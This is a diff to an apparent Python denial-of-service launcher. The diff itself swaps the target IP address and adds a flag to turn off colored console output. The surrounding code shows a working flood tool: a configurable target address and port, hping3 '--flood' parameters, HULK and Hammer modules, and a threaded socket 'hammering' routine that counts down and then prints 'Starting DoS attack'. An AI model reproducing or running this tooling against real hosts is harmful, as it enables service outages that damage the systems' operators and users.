@@ -19,7 +19,7 @@ class Config:
     def __init__(self):
         self.Platform = "win"
 
-        self.ATKIPv4 = "192.168.52.59"
+        self.ATKIPv4 = "192.168.137.203"
         self.ATKPort = 445  # default 80
 
         self.HPING3 = False
@@ -27,6 +27,7 @@ class Config:
         self.HULK = True
 
         self.waitTime = 5  # seconds
+        self.printColor = False
 
         self.HPING3_PARAMETERS = [
             ("  ", 1e9, "--flood", "", 0),
@@ -54,9 +55,12 @@ class Config:
             self.HPING3 = False
         if self.Platform == self.Platform2:
             # linux
-            print(
-                f'{Bcolors.WARNING} Make sure to be "sudo su" before executing this script. {Bcolors.ENDC}'
-            )
+            if self.printColor:
+                print(
+                    f'{Bcolors.WARNING} Make sure to be "sudo su" before executing this script. {Bcolors.ENDC}'
+                )
+            else:
+                print("Make sure to be 'sudo su' before executing this script.")
 
 
 class Bcolors:
@@ -156,42 +160,16 @@ def hammering():
                                 (ip, port),
                             )
                         except socket.error:
-                            print(
-                                Bcolors.WARNING
-                                + "ERROR, Maybe the host is down?!?!"
-                                + Bcolors.ENDC
-                            )
+                            print("ERROR, Maybe the host is down?!?!")
                         except KeyboardInterrupt:
-                            print(
-                                Bcolors.BOLD
-                                + Bcolors.FAIL
-                                + "\r\n[-] Canceled by user"
-                                + Bcolors.ENDC
-                                + Bcolors.ENDC
-                            )
+                            print("\r\n[-] Canceled by user")
                 except socket.error:
-                    print(
-                        Bcolors.WARNING
-                        + "ERROR, Maybe the host is down?!?!"
-                        + Bcolors.ENDC
-                    )
+                    print("ERROR, Maybe the host is down?!?!")
                 except KeyboardInterrupt:
-                    print(
-                        Bcolors.BOLD
-                        + Bcolors.FAIL
-                        + "\r\n[-] Canceled by user"
-                        + Bcolors.ENDC
-                        + Bcolors.ENDC
-                    )
+                    print("\r\n[-] Canceled by user")
                 dosSocket.close()
         except KeyboardInterrupt:
-            print(
-                Bcolors.BOLD
-                + Bcolors.FAIL
-                + "\r\n[-] Canceled by user"
-                + Bcolors.ENDC
-                + Bcolors.ENDC
-            )
+            print("\r\n[-] Canceled by user")
 
     print(f" [+] Hammering server {host}")
     try:
@@ -200,21 +178,9 @@ def hammering():
                 t = Thread(target=goForDosThatThing)
                 t.start()
             except KeyboardInterrupt:
-                print(
-                    Bcolors.BOLD
-                    + Bcolors.FAIL
-                    + "\r\n[-] Canceled by user"
-                    + Bcolors.ENDC
-                    + Bcolors.ENDC
-                )
+                print("\r\n[-] Canceled by user")
     except KeyboardInterrupt:
-        print(
-            Bcolors.BOLD
-            + Bcolors.FAIL
-            + "\r\n[-] Canceled by user"
-            + Bcolors.ENDC
-            + Bcolors.ENDC
-        )
+        print("\r\n[-] Canceled by user")
 
 
 """
@@ -252,12 +218,18 @@ main.py
 
 if __name__ == "__main__":
     for i in range(config.waitTime):
-        print(
-            f"\n{Bcolors.OKGREEN}{5-i} seconds before attacking {config.ATKIPv4}....{Bcolors.ENDC}"
-        )
+        if config.printColor:
+            print(
+                f"\n{Bcolors.OKGREEN}{5-i} seconds before attacking {config.ATKIPv4}....{Bcolors.ENDC}"
+            )
+        else:
+            print(f"\n{5-i} seconds before attacking {config.ATKIPv4}....")
         time.sleep(1)
 
-    print(f"\n{Bcolors.OKGREEN}Starting DoS attack...{Bcolors.ENDC}")
+    if config.printColor:
+        print(f"\n{Bcolors.OKGREEN}Starting DoS attack...{Bcolors.ENDC}")
+    else:
+        print(f"\nStarting DoS attack...")
     try:
         processes = 0
         if config.HPING3:
@@ -274,10 +246,16 @@ if __name__ == "__main__":
             p_hammer.start()
             processes += 1
         if processes == 0:
-            print(f"{Bcolors.FAIL}[-] No DoS tools selected.{Bcolors.ENDC}")
+            if config.printColor:
+                print(f"{Bcolors.FAIL}[-] No DoS tools selected.{Bcolors.ENDC}")
+            else:
+                print(f"[-] No DoS tools selected.")
             exit(0)
     except KeyboardInterrupt:
-        print(f"{Bcolors.FAIL}[-] Canceled by user{Bcolors.ENDC}")
+        if config.printColor:
+            print(f"{Bcolors.FAIL}[-] Canceled by user{Bcolors.ENDC}")
+        else:
+            print(f"[-] Canceled by user")
         if config.HPING3:
             p_hping3.terminate()
         if config.Hammer:
@@ -285,4 +263,7 @@ if __name__ == "__main__":
         if config.HULK:
             p_hulk.terminate()
 
-    print(f"{Bcolors.OKGREEN}Started DoS attack.{Bcolors.ENDC}")
+    if config.printColor:
+        print(f"{Bcolors.OKGREEN}Started DoS attack.{Bcolors.ENDC}")
+    else:
+        print(f"Started DoS attack.")
